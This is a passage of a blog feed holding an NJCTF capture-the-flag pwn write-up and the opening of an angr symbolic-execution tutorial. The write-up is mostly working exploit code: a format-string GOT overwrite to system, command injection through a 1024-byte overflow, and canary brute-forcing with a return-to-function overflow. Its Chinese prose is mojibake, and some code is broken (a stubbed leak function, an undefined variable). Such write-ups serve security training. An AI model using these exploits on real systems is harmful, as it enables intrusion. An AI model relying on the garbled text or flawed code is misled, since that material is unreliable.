class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>(<span class="params">io, addr</span>):</span></span><br><span class="line">    prefix = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> addr&amp;<span class="number">0xff</span> == <span class="number">0x0a</span>:</span><br><span class="line">        prefix = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;-..-%%%d$s.--.\x00&quot;</span>%(<span class="number">7</span>+<span class="number">10</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">40</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    payload += l32(addr)</span><br><span class="line">    io.writeline(payload)</span><br><span class="line">    io.read_until(<span class="string">&quot;-..-&quot;</span>)</span><br><span class="line">    data = io.read_until(<span class="string">&quot;.--.&quot;</span>)[:<span class="number">-4</span>] + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> prefix + data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_buff</span>(<span class="params">io, addr, size</span>):</span></span><br><span class="line"></span><br><span class="line">    buff = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> len(buff) &lt; size:</span><br><span class="line">        buff += get_data(io, addr + len(buff))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> buff</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump_file</span>(<span class="params">io</span>):</span></span><br><span class="line"></span><br><span class="line">    io.read_until(<span class="string">&quot;Ping me\n&quot;</span>)</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    payload = &quot;&quot;</span></span><br><span class="line"><span class="string">    payload += &quot;%%%d$s.&quot;%(7+10)</span></span><br><span class="line"><span class="string">    payload = payload.ljust(40, &#x27;a&#x27;)</span></span><br><span class="line"><span class="string">    payload += l32(0x80484F0)</span></span><br><span class="line"><span class="string">    io.writeline(payload)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#data = get_data(io, 0x8048000)</span></span><br><span class="line">    <span class="comment">#print &quot;data:&quot;, repr(data)</span></span><br><span class="line">    buff = get_buff(io, <span class="number">0x8048400</span>, <span class="number">0x700</span>)</span><br><span class="line">    file_w = open(<span class="string">&quot;dump.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">    file_w.write(buff)</span><br><span class="line">    file_w.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;ok&quot;</span></span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-njctf-fmt.pnt" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-njctf-fmt.pnt"></a></p><p>é€»è¾‘æ¸…æ™°ã€€233ã€€æ ¼å¼ä¸²æ¼æ´ï¼Œæˆ‘ä»¬éœ€è¦è·å¾—libcæˆ–è€…ä½¿ç”¨DynELFè·å–systemåœ°å€ã€‚</p><p>å¯ä»¥åœ¨9kå¸ˆå‚…æ‰“libc dbçš„åº“ä¸­ï¼Œæ‰¾åˆ°libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">&quot;218.2.197.235&quot;</span>,<span class="number">23745</span>)</span><br><span class="line">    <span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(<span class="string">&quot;./pingme&quot;</span>)</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x08048617</span></span><br><span class="line">printf_got = <span class="number">0x08049974</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote(&quot;218.2.197.235&quot;, 23745)#pwn</span></span><br><span class="line"><span class="comment">#r = process(&quot;./pingme&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = p32(addr)</span><br><span class="line">    payload += <span class="string">&quot;%7$sDCBA&quot;</span>  <span class="comment"># $rsp address</span></span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    data = r.recv(<span class="number">4</span>)</span><br><span class="line">    f = <span class="number">4</span></span><br><span class="line">    <span class="comment"># l = data.find(&quot;DCBA&quot;)</span></span><br><span class="line">    res = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> res == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        log.info(<span class="string">&quot;[*] addr:&#123;0&#125; ===&gt; value:&#123;1&#125;&quot;</span>.format(hex(addr), <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\x00&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log.info(<span class="string">&quot;[*] addr:&#123;0&#125; ===&gt; value:&#123;1&#125;&quot;</span>.format(hex(addr), res[:<span class="number">4</span>].encode(<span class="string">&quot;hex&quot;</span>)))</span><br><span class="line">        <span class="keyword">return</span> res[:<span class="number">4</span>]<span class="comment">#res = res.ljust(4, &quot;\x00&quot;)</span></span><br><span class="line"><span class="comment">#leak()</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;me\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_addr = leak(printf_got)</span><br><span class="line">printf_addr = printf_addr</span><br><span class="line">printf_addr = u32(printf_addr)</span><br><span class="line"><span class="comment"># print &quot;[*] printf addr:&#123;0&#125;&quot;.format(hex(printf_addr)) #printf addr:0xf7596020</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># system_addr = printf_addr - 0xe6e0#0xd100</span></span><br><span class="line"><span class="comment"># print &quot;[*] system addr:&#123;0&#125;&quot;.format(hex(system_addr)) #system addr:0xf7587940</span></span><br><span class="line"></span><br><span class="line">d = DynELF(leak,printf_addr)</span><br><span class="line">system_addr = d.lookup(<span class="string">&quot;system&quot;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;systemAddr = %#x&#x27;</span> % (systemAddr)</span><br><span class="line"></span><br><span class="line">write = system_addr &amp; <span class="number">0xffffff</span></span><br><span class="line">two = write&amp;<span class="number">0xffff</span></span><br><span class="line">one = (write&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">payload = p32(printf_got+<span class="number">2</span>)</span><br><span class="line">payload += p32(printf_got)</span><br><span class="line">payload += <span class="string">&quot;%&#123;0&#125;c%7$hhn%&#123;1&#125;c%8$hn&quot;</span>.format(one<span class="number">-8</span>,two-one)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>dumpã€€fileä»£ç æ˜¯pxxå¸ˆå‚…çš„ã€€æˆ‘è‡ªå·±æ‰“æ–¹æ³•å¤±è´¥äº†ã€€23333</p><h1 id="VSVS"><a href="#VSVS" class="headerlink" title="VSVS"></a>VSVS</h1><p>ä»£ç æ‰§è¡Œï¼Œåœ¨nameçš„ä½ç½®è¾“å…¥è¶…è¿‡1024ä¸ªå­—èŠ‚åç´§è·Ÿbashï¼Œä¹‹åçš„å‘½ä»¤ä¼šè¢« å½“æˆå‘½ä»¤æ‰§è¡Œ<br>éªŒè¯codeå¯æš´åŠ›è§£å†³</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">NJCTF&#123;e24de6dea4b118a8f7986fe853c15fce&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;218.2.197.235&#x27;</span>, <span class="number">23749</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;code:\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;22&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">1024</span></span><br><span class="line">payload += <span class="string">&quot;cat&lt;flag&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> r.recv(<span class="number">100</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="Pwn200"><a href="#Pwn200" class="headerlink" title="Pwn200"></a>Pwn200</h1><p>æ ˆæº¢å‡ºç®€å•ç²—æš´ï¼Œä¸è¿‡éœ€è¦æš´åŠ›çŒœè§£canaryï¼Œç„¶åç›´æ¥retåˆ°send flagçš„å‡½æ•°é‚£é‡Œï¼ŒæŠŠflagè¯»å›æ¥ã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ç”±äºæ˜¯forkçš„ç¨‹åºï¼Œè€ƒè™‘çˆ†ç ´canary</span></span><br><span class="line"><span class="comment">#çˆ†ç ´è„šæœ¬å¦‚ä¸‹ï¼š</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;joker&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">canary = <span class="string">&quot;\x00&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> len(canary) == <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> range(<span class="number">0xff</span>):</span><br><span class="line">        canary_tmp = canary + chr(item)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = remote(<span class="string">&#x27;218.2.197.234&#x27;</span>, <span class="number">2090</span>)</span><br><span class="line">            r.recvuntil(<span class="string">&quot;Welcome!\n&quot;</span>)</span><br><span class="line">            payload = <span class="string">&quot;A&quot;</span>*(<span class="number">0x70</span><span class="number">-8</span>)</span><br><span class="line">            payload += canary_tmp</span><br><span class="line">            r.send(payload)</span><br><span class="line">            data = r.recv(<span class="number">100</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Message received!&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                canary += chr(item)</span><br><span class="line">                <span class="keyword">print</span> <span class="string">&quot;get:&#123;0&#125;&quot;</span>.format(hex(item))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            r.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    raw_input(<span class="string">&quot;joker&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[*] canary:&#123;0&#125;&quot;</span>.format(u64(canary))</span><br></pre></td></tr></table></figure><p>ç¨‹åºè¯»å–äº†flagå¹¶ä¸”å­˜åœ¨ç›´æ¥send flagçš„payload<br>.text:0000000000400BCA                 mov     eax, cs:fd<br>.text:0000000000400BD0                 mov     ecx, 0<br>.text:0000000000400BD5                 mov     edx, 64h<br>.text:0000000000400BDA                 mov     esi, offset flag_address<br>.text:0000000000400BDF                 mov     edi, eax<br>.text:0000000000400BE1                 call    _send</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;joker&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#local canary = 0x6767cae5244b5000</span></span><br><span class="line">canary = <span class="string">&quot;\x00\xcf\x4d\x36\x2e\xf4\xcc\x9d&quot;</span></span><br><span class="line">send_flag = <span class="number">0x400BCA</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;218.2.197.234&#x27;</span>,<span class="number">2090</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Welcome!&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*(<span class="number">0x70</span><span class="number">-8</span>)</span><br><span class="line">payload += canary</span><br><span class="line">payload += <span class="string">&quot;A&quot;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0x400BCA</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> r.recv(<span class="number">100</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="re400"><a href="#re400" class="headerlink" title="re400"></a>re400</h1><p>å¯åœ¨ç¨‹åºä¸­æ‰¾åˆ°ç›®æ ‡md5å€¼ï¼Œè¾“å…¥å¹¶å°è¯•ç”¨gdbå»è°ƒè¯•å¯ä»¥çŒœåˆ°flagå€¼ã€‚</p><p>ï¼ƒ æˆ˜é˜Ÿï¼·ï¼°<br><a href="https://www.xctf.org.cn/information/2a195fab682c600b5493f42cddd3acb8f4df443a/">wp</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> NJCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>angråˆæ¢</title>
      <link href="angr-study.html"/>
      <url>angr-study.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>æœ€è¿‘muheå¸ˆå‚…ï¼Œç»™æˆ‘å‘äº†ä¸€ä¸ªPDFï¼Œæ˜¯æ¹¾æ¹¾å†™çš„äºŒè¿›åˆ¶è‡ªåŠ¨åŒ–åˆ†ææ”»å‡»ï¼Œä»–çš„æ–‡æ¡£ä¸»è¦å†™çš„ä¸Šangrï¼Œäºæ˜¯ç©å¯¹è¿™ä¸ªç©æ„å„¿ä¹Ÿå¼€å§‹æœ‰äº†ä¸€ç‚¹å…´è¶£ã€‚åˆšå¥½å‡æœŸjoekrå¸ˆå‚…ç»™æˆ‘å‘äº†ä¸€ä¸ªangråˆ†æçš„äºŒè¿›åˆ¶é¢˜ç›®ã€‚äºæ˜¯2333 å°±å¼€å§‹äº†æŠ˜è…¾ã€‚</p><h1 id="ä»€ä¹ˆæ˜¯angr"><a href="#ä»€ä¹ˆæ˜¯angr" class="headerlink" title="ä»€ä¹ˆæ˜¯angr"></a>ä»€ä¹ˆæ˜¯angr</h1><p>angræ˜¯ä¸€ä¸ªç”¨äºåˆ†æäºŒè¿›åˆ¶æ–‡ä»¶çš„pythonæ¡†æ¶ã€‚å®ƒä¸“æ³¨äºé™æ€å’Œç¬¦å·åˆ†æï¼Œä½¿å…¶é€‚ç”¨äºå„ç§ä»»åŠ¡ã€‚å…¶é¡¹ç›®åœ°å€æ˜¯ï¼Œ<a href="https://github.com/angr">https://github.com/angr</a>.</p><h1 id="ä»€ä¹ˆæ˜¯ç¬¦å·æ‰§è¡Œ"><a href="#ä»€ä¹ˆæ˜¯ç¬¦å·æ‰§è¡Œ" class="headerlink" title="ä»€ä¹ˆæ˜¯ç¬¦å·æ‰§è¡Œ"></a>ä»€ä¹ˆæ˜¯ç¬¦å·æ‰§è¡Œ</h1><p><em>æ¥è‡ªç»´åŸºç™¾ç§‘</em><br>ç¬¦å·æ‰§è¡Œ ï¼ˆSymbolic Executionï¼‰æ˜¯ä¸€ç§ç¨‹åºåˆ†ææŠ€æœ¯ã€‚å…¶å¯ä»¥é€šè¿‡åˆ†æç¨‹åºæ¥å¾—åˆ°è®©ç‰¹å®šä»£ç åŒºåŸŸæ‰§è¡Œçš„è¾“å…¥ã€‚ä½¿ç”¨ç¬¦å·æ‰§è¡Œåˆ†æä¸€ä¸ªç¨‹åºæ—¶ï¼Œè¯¥ç¨‹åºä¼šä½¿ç”¨ç¬¦å·å€¼ä½œä¸ºè¾“å…¥ï¼Œè€Œéä¸€èˆ¬æ‰§è¡Œç¨‹åºæ—¶ä½¿ç”¨çš„å…·ä½“å€¼ã€‚åœ¨è¾¾åˆ°ç›®æ ‡ä»£ç æ—¶ï¼Œåˆ†æå™¨å¯ä»¥å¾—åˆ°ç›¸åº”çš„è·¯å¾„çº¦æŸï¼Œç„¶åé€šè¿‡çº¦æŸæ±‚è§£å™¨æ¥å¾—åˆ°å¯ä»¥è§¦å‘ç›®æ ‡ä»£ç çš„å…·ä½“å€¼ã€‚[1]<br>ç¬¦å·æ¨¡æ‹ŸæŠ€æœ¯ï¼ˆsymbolic simulationï¼‰åˆ™æŠŠç±»ä¼¼çš„æ€æƒ³ç”¨äºç¡¬ä»¶åˆ†æã€‚ç¬¦å·è®¡ç®—ï¼ˆSymbolic computationï¼‰åˆ™ç”¨äºæ•°å­¦è¡¨è¾¾å¼åˆ†æã€‚</p><h1 id="angrå®‰è£…-ä»¥åŠé‡åˆ°çš„å‘"><a href="#angrå®‰è£…-ä»¥åŠé‡åˆ°çš„å‘" class="headerlink" title="angrå®‰è£… ä»¥åŠé‡åˆ°çš„å‘"></a>angrå®‰è£… ä»¥åŠé‡åˆ°çš„å‘</h1><p>æˆ‘è¿™ä½¿ç”¨çš„æ˜¯ubutnuç³»ç»Ÿï¼š</p><h2 id="å®‰è£…ä¾èµ–"><a href="#å®‰è£…ä¾èµ–" class="headerlink" title="å®‰è£…ä¾èµ–"></a>å®‰è£…ä¾èµ–</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-dev libffi-dev build-essential virtualenvwrapper</span><br></pre></td></tr></table></figure><p>å¦‚æœä½ æ­£åœ¨å°è¯•angrç®¡ç†ï¼Œä½ ä¼šéœ€è¦å®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libqt4-dev graphviz-dev</span><br></pre></td></tr></table></figure><h2 id="åˆ›å»ºè™šæ‹Ÿç¯å¢ƒä»¥åŠå®‰è£…angræ¨¡å—"><a href="#åˆ›å»ºè™šæ‹Ÿç¯å¢ƒä»¥åŠå®‰è£…angræ¨¡å—" class="headerlink" title="åˆ›å»ºè™šæ‹Ÿç¯å¢ƒä»¥åŠå®‰è£…angræ¨¡å—"></a>åˆ›å»ºè™šæ‹Ÿç¯å¢ƒä»¥åŠå®‰è£…angræ¨¡å—</h2><p><code>mkvirtualenv angr &amp;&amp; pip install angr</code>é€šå¸¸åº”è¯¥è¶³å¤Ÿåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹å®‰è£…angrï¼Œå› ä¸ºangrå‘å¸ƒåœ¨PythonåŒ…ç´¢å¼•ä¸Šã€‚<br>Fishï¼ˆshellï¼‰ç”¨æˆ·å¯ä»¥ä½¿ç”¨virtualfishæˆ–virtualenvåŒ…ã€‚<br><code>vf new angr &amp;&amp; vf activate angr &amp;&amp; pip install angr</code></p><h2 id="é‡åˆ°çš„å‘"><a href="#é‡åˆ°çš„å‘" class="headerlink" title="é‡åˆ°çš„å‘"></a>é‡åˆ°çš„å‘</h2><blockquote><p>ç”±äºåœ¨å¯¼å…¥angræ—¶åŠ è½½capstoneå¤±è´¥å¯¼è‡´çš„ImportError</p></blockquote><p>å®˜æ–¹æ–‡æ¡£ä»”ç»†ä»‹ç»äº†å¦‚ä½•å‡ ç§å¸¸è§çš„é”™è¯¯æŠ¥å‘Šï¼Œæˆ‘è¿™é‡Œé‡åˆ°çš„æ˜¯ä¸Šé¢çš„è¿™ç§ã€‚è§£å†³æ–¹æ³•æœ‰ä¸¤ç§ï¼š</p><ol><li>pip install -I â€“no-use-wheel capston</li><li>ç§»åŠ¨libcapstone.soåˆ°ä¸Pythonæ–‡ä»¶ç›¸åŒçš„ç›®å½•</li></ol><h1 id="angrç®€å•ä½¿ç”¨"><a href="#angrç®€å•ä½¿ç”¨" class="headerlink" title="angrç®€å•ä½¿ç”¨"></a>angrç®€å•ä½¿ç”¨</h1><h2 id="è£…è½½äºŒè¿›åˆ¶æ–‡ä»¶"><a href="#è£…è½½äºŒè¿›åˆ¶æ–‡ä»¶" class="headerlink" title="è£…è½½äºŒè¿›åˆ¶æ–‡ä»¶"></a>è£…è½½äºŒè¿›åˆ¶æ–‡ä»¶</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = angr.Project(<span class="string">&quot;/binnary/&quot;</span>)   <span class="comment"># è¿™é‡Œæ”¾çš„æ˜¯binçš„è·¯å¾„</span></span><br></pre></td></tr></table></figure><p>æ›´å¤šè¯¦ç»†çš„ä¸œè¥¿ï¼Œæˆ‘å°±ä¸å½“æ¬è¿å·¥äº†ï¼Œå¯ä»¥è½¬<a href="https://docs.angr.io/docs/loading.html">https://docs.angr.io/docs/loading.html</a></p><h1 id="angrè„šæœ¬"><a href="#angrè„šæœ¬" class="headerlink" title="angrè„šæœ¬"></a>angrè„šæœ¬</h1><p>å¦‚æœä¸Šä¸€ä¸ªæ ‡é¢˜çš„å†…å®¹ï¼Œå³angræ¡†æ¶çš„åŸºæœ¬ç”¨æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹å­¦ä¹ ä¸€ä¸‹angrçš„è¿ç”¨ï¼Œä»¥åŠè„šæœ¬çš„ç¼–å†™ã€‚<br><em>YSC</em> æ•´ç†äº†angræ¯”è¾ƒå¸¸ç”¨çš„æ–¹æ³•ï¼š</p><ul><li>Surveyours</li><li>Path group</li><li>Symbolic args</li><li>Symbolic input</li><li>Breakpoint</li><li>Hook<h2 id="Surveyours"><a href="#Surveyours" class="headerlink" title="Surveyours"></a>Surveyours</h2>Surveyoræ˜¯é©±åŠ¨ç¬¦å·æ‰§è¡Œçš„å¼•æ“ï¼šå®ƒè·Ÿè¸ªå“ªäº›è·¯å¾„å¤„äºæ´»åŠ¨çŠ¶æ€ï¼Œæ ‡è¯†å“ªäº›è·¯å¾„å‘å‰è½¬ï¼Œå“ªäº›è·¯å¾„è¦ä¿®å‰ªï¼Œå¹¶ä¼˜åŒ–èµ„æºçš„åˆ†é…ã€‚<br>ä½†æ˜¯åœ¨å®˜æ–¹æ–‡æ¡£çš„ä»‹ç»å½“ä¸­ï¼Œä»–æ˜¯æ›´åŠ æ¨èçš„æ˜¯ä½¿ç”¨<em>PathGroups</em>çš„ä½¿ç”¨ã€‚<br>æœ€åŸºæœ¬çš„ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·ä½¿ç”¨ä»–<h3 id="Explorer"><a href="#Explorer" class="headerlink" title="Explorer"></a>Explorer</h3><code>angr.surveyor.Explore</code>æ˜¯<code>Surveyor</code>å®ç°ç¬¦å·æ‰§è¡Œçš„ä¸€ä¸ªæ–¹æ³•ã€‚å®ƒå°†å®ç°èµ·ç‚¹ï¼Œç›®æ ‡ï¼Œè¿‡æ»¤ç­‰åŠŸèƒ½ï¼Œä»¥åŠç¡®å®šæ‰§è¡Œçš„è·¯å¾„é¿å…é™·å…¥æ— è°“çš„å¾ªç¯å½“ä¸­ã€‚<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">b =  angr.Project(<span class="string">&quot;./examples/Bin&quot;</span>) <span class="comment"># ç¬¬ä¸€å°±æ˜¯åŸºæœ¬çš„è½½å…¥äºŒè¿›åˆ¶æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">e =  b.surveyor.Explore()</span><br><span class="line"><span class="keyword">print</span> e.step() <span class="comment"># æš‚åœ</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> e.run() <span class="comment"># å¼€å§‹</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;%d paths are still running&quot;</span> % len(e.active)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;%d paths are backgrounded due to lack of resources&quot;</span> % len(e.spilled)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;%d paths are suspended due to user action&quot;</span> % len(e.suspended)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;%d paths had errors&quot;</span> % len(e.errored)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;%d paths deadended&quot;</span> % len(e.deadended)</span><br></pre></td></tr></table></figure>ä¸Šé¢çš„è„šæœ¬å¹¶æ²¡æœ‰åšä»»ä½•ç®€å•çš„é™åˆ¶ï¼Œå› æ­¤ï¼Œæƒ³å¿…ä»»åŠ¡é‡æ˜¯æå…¶å¤§çš„ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥åšä¸€äº›æ¡ä»¶ã€‚<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">e = b.surveyors.Explorer(find=(<span class="number">0x4006ed</span>,), avoid=(<span class="number">0x4006aa</span>,<span class="number">0x4006fd</span>))</span><br><span 